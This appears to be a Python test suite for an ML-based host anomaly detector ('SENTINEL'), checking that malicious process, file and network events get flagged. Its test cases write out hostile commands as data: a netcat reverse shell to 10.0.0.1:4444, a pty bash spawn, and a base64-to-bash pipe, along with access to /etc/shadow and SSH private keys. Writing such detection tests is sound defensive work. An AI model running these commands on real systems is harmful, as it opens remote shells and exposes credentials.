#!/usr/bin/env python3
import sys
import os
import json
import random
sys.path.insert(0, os.path.expanduser('~/sentinel/src/ai'))
from ml_anomaly import MLAnomalyDetector

def test_ml_detector():
    print("=" * 60)
    print("   SENTINEL ML Anomaly Detector - TEST SUITE")
    print("=" * 60)

    detector = MLAnomalyDetector()

    # ── Test 1: Process Anomaly ───────────────────────────
    print("\n[TEST 1] Process Anomaly Detection")
    print("-" * 40)
    print("[*] Training with diverse normal process events...")

    # Diverse normal training data
    normal_processes = [
        '/usr/bin/bash', '/usr/bin/python3', '/usr/bin/vim',
        '/usr/bin/git', '/usr/bin/ssh', '/usr/bin/apt',
        '/usr/bin/systemctl', '/usr/bin/journalctl',
        '/usr/bin/ls', '/usr/bin/cat', '/usr/bin/grep',
        '/usr/bin/find', '/usr/bin/ps', '/usr/bin/top',
        '/usr/bin/nginx', '/usr/bin/sshd', '/usr/bin/cron'
    ]

    for i in range(200):
        cmd = random.choice(normal_processes)
        uid = random.choice([0, 1000, 1001])
        detector.add_process_event({
            'pid': 1000 + i,
            'ppid': random.randint(1, 100),
            'uid': uid,
            'comm': os.path.basename(cmd),
            'cmdline': f'{cmd} --option{i}',
            'is_root': uid == 0
        })

    print("[✓] Training complete")

    test_cases = [
        {
            'name': 'Normal bash process',
            'event': {
                'pid': 2000,
                'ppid': 1,
                'uid': 1000,
                'comm': 'bash',
                'cmdline': '/usr/bin/bash --login',
                'is_root': False
            },
            'expected': 'Normal'
        },
        {
            'name': 'Python reverse shell',
            'event': {
                'pid': 9999,
                'ppid': 1,
                'uid': 0,
                'comm': 'python3',
                'cmdline': 'python -c "import pty; pty.spawn(\'/bin/bash\')"',
                'is_root': True
            },
            'expected': 'Anomaly'
        },
        {
            'name': 'Netcat backdoor',
            'event': {
                'pid': 8888,
                'ppid': 1,
                'uid': 0,
                'comm': 'nc',
                'cmdline': 'nc -e /bin/bash 10.0.0.1 4444',
                'is_root': True
            },
            'expected': 'Anomaly'
        },
        {
            'name': 'Base64 encoded command',
            'event': {
                'pid': 7777,
                'ppid': 1,
                'uid': 0,
                'comm': 'bash',
                'cmdline': 'bash -c "echo d2hvYW1p|base64 -d|bash"',
                'is_root': True
            },
            'expected': 'Anomaly'
        },
    ]

    results = []
    for tc in test_cases:
        result = detector.add_process_event(tc['event'])
        detected = result is not None
        expected = tc['expected'] == 'Anomaly'
        passed = detected == expected

        results.append(passed)
        status = "⚠️  ANOMALY" if result else "✓ NORMAL"
        mark = "✅" if passed else "❌"
        print(f"  {mark} {status:12} - {tc['name']}")
        if result:
            print(f"               Score: {result['score']:.4f}, "
                  f"Severity: {result['severity']}")

    test1_passed = all(results)
    print(f"\n[TEST 1] {'✓ PASSED' if test1_passed else '✗ FAILED'}")

    # ── Test 2: File Anomaly ──────────────────────────────
    print("\n[TEST 2] File Access Anomaly Detection")
    print("-" * 40)
    print("[*] Training with diverse normal file events...")

    normal_paths = [
        '/home/user/documents', '/home/user/downloads',
        '/var/log/syslog', '/var/log/auth.log',
        '/usr/lib/python3', '/usr/share/doc',
        '/tmp/tmpfile', '/proc/cpuinfo',
        '/etc/hosts', '/etc/resolv.conf',
        '/home/user/.bashrc', '/home/user/.profile'
    ]

    for i in range(200):
        path = random.choice(normal_paths)
        detector.add_file_event({
            'path': f'{path}_{i}.txt',
            'flags': 0,
            'is_write': False,
            'is_root': False
        })

    print("[✓] Training complete")

    file_cases = [
        {
            'name': 'Normal file read',
            'event': {
                'path': '/home/user/document.txt',
                'flags': 0,
                'is_write': False,
                'is_root': False
            },
            'expected': 'Normal'
        },
        {
            'name': 'Write to /etc/shadow',
            'event': {
                'path': '/etc/shadow',
                'flags': 1,
                'is_write': True,
                'is_root': True
            },
            'expected': 'Anomaly'
        },
        {
            'name': 'Access SSH private key',
            'event': {
                'path': '/root/.ssh/id_rsa',
                'flags': 0,
                'is_write': False,
                'is_root': True
            },
            'expected': 'Anomaly'
        },
        {
            'name': 'Load kernel module',
            'event': {
                'path': '/tmp/rootkit.ko',
                'flags': 1,
                'is_write': True,
                'is_root': True
            },
            'expected': 'Anomaly'
        },
    ]

    results = []
    for tc in file_cases:
        result = detector.add_file_event(tc['event'])
        detected = result is not None
        expected = tc['expected'] == 'Anomaly'
        passed = detected == expected

        results.append(passed)
        status = "⚠️  ANOMALY" if result else "✓ NORMAL"
        mark = "✅" if passed else "❌"
        print(f"  {mark} {status:12} - {tc['name']}")
        if result:
            print(f"               Score: {result['score']:.4f}, "
                  f"Severity: {result['severity']}")

    test2_passed = all(results)
    print(f"\n[TEST 2] {'✓ PASSED' if test2_passed else '✗ FAILED'}")

    # ── Test 3: Network Anomaly ───────────────────────────
    print("\n[TEST 3] Network Anomaly Detection")
    print("-" * 40)
    print("[*] Training with diverse normal network events...")

    for i in range(200):
        detector.add_network_event({
            'src_ip': f'192.168.1.{random.randint(1,50)}',
            'src_port': random.randint(10000, 60000),
            'dst_port': random.choice([80, 443, 22, 53]),
            'protocol': 6,
            'packet_size': random.randint(64, 1500),
            'is_root': False
        })

    print("[✓] Training complete")

    net_cases = [
        {
            'name': 'Normal HTTP connection',
            'event': {
                'src_ip': '192.168.1.10',
                'src_port': 45678,
                'dst_port': 80,
                'protocol': 6,
                'packet_size': 512,
                'is_root': False
            },
            'expected': 'Normal'
        },
        {
            'name': 'Metasploit port 4444',
            'event': {
                'src_ip': '10.0.0.1',
                'src_port': 4444,
                'dst_port': 4444,
                'protocol': 6,
                'packet_size': 2048,
                'is_root': True
            },
            'expected': 'Anomaly'
        },
        {
            'name': 'Telnet connection',
            'event': {
                'src_ip': '192.168.1.100',
                'src_port': 54321,
                'dst_port': 23,
                'protocol': 6,
                'packet_size': 128,
                'is_root': True
            },
            'expected': 'Anomaly'
        },
    ]

    results = []
    for tc in net_cases:
        result = detector.add_network_event(tc['event'])
        detected = result is not None
        expected = tc['expected'] == 'Anomaly'
        passed = detected == expected

        results.append(passed)
        status = "⚠️  ANOMALY" if result else "✓ NORMAL"
        mark = "✅" if passed else "❌"
        print(f"  {mark} {status:12} - {tc['name']}")
        if result:
            print(f"               Score: {result['score']:.4f}, "
                  f"Severity: {result['severity']}")

    test3_passed = all(results)
    print(f"\n[TEST 3] {'✓ PASSED' if test3_passed else '✗ FAILED'}")

    # ── Statistics ────────────────────────────────────────
    print("\n[STATISTICS]")
    print("-" * 40)
    stats = detector.get_statistics()
    print(f"  Process trained:  {stats['process_trained']}")
    print(f"  File trained:     {stats['file_trained']}")
    print(f"  Network trained:  {stats['network_trained']}")
    print(f"  Process window:   {stats['window_sizes']['process']}")
    print(f"  File window:      {stats['window_sizes']['file']}")
    print(f"  Network window:   {stats['window_sizes']['network']}")

    # ── Summary ───────────────────────────────────────────
    print("\n" + "=" * 60)
    all_passed = test1_passed and test2_passed and test3_passed
    if all_passed:
        print("[✓] ALL TESTS PASSED!")
        print("[✓] ML detection working correctly!")
    else:
        print("[!] Some tests failed - model needs tuning")
        print("[*] This is normal - ML models need real data")
        print("[*] Will improve with VM2 rootkit testing")
    print("=" * 60)

if __name__ == "__main__":
    test_ml_detector()
